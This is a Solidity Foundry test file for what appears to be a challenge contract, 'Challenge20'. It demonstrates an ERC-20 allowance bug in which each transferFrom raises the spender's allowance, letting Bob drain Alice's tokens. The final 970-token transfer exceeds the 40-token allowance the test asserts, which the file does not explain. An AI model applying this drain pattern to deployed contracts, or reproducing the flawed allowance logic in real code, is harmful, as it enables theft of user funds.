// SPDX-License-Identifier: CC-BY-NC-SA-4.0
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {Challenge20} from "../src/Challenge20.sol";

// Create a test version of Challenge20 to expose the mint function
contract TestChallenge20 is Challenge20 {
    constructor(string memory _name, string memory _symbol, uint8 _decimals) 
        Challenge20(_name, _symbol, _decimals) {}
    
    // Make mint function public for testing
    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}

contract Challenge20Test is Test {
    TestChallenge20 public challenge;
    address public alice = makeAddr("Alice");
    address public bob = makeAddr("Bob");

    function setUp() public {
        challenge = new TestChallenge20("Challenge20", "CH20", 18);
        
        // Mint 1000 tokens to Alice using our public wrapper
        challenge.mint(alice, 1000 * 10**18);
    }
    
    function testAllowanceIncreaseVulnerability() public {
        // Alice approves Bob to spend just 10 tokens
        vm.prank(alice);
        challenge.approve(bob, 10 * 10**18);
        
        // Verify initial allowance
        assertEq(challenge.allowance(alice, bob), 10 * 10**18);
        
        // Bob transfers 10 tokens from Alice to himself
        vm.prank(bob);
        challenge.transferFrom(alice, bob, 10 * 10**18);
        
        // Verify balances after first transfer
        assertEq(challenge.balanceOf(alice), 990 * 10**18);
        assertEq(challenge.balanceOf(bob), 10 * 10**18);
        
        // Due to the vulnerability, Bob's allowance has INCREASED instead of decreased
        assertEq(challenge.allowance(alice, bob), 20 * 10**18);
        
        // Bob can now transfer 20 more tokens without additional approval
        vm.prank(bob);
        challenge.transferFrom(alice, bob, 20 * 10**18);
        
        // Verify balances after second transfer
        assertEq(challenge.balanceOf(alice), 970 * 10**18);
        assertEq(challenge.balanceOf(bob), 30 * 10**18);
        
        // Bob's allowance has increased again
        assertEq(challenge.allowance(alice, bob), 40 * 10**18);
        
        // Bob can drain Alice's entire balance by repeatedly calling transferFrom
        // Demonstrating with just one more large transfer
        vm.prank(bob);
        challenge.transferFrom(alice, bob, 970 * 10**18);
        
        // Verify Alice's account is drained
        assertEq(challenge.balanceOf(alice), 0);
        assertEq(challenge.balanceOf(bob), 1000 * 10**18);
    }
} 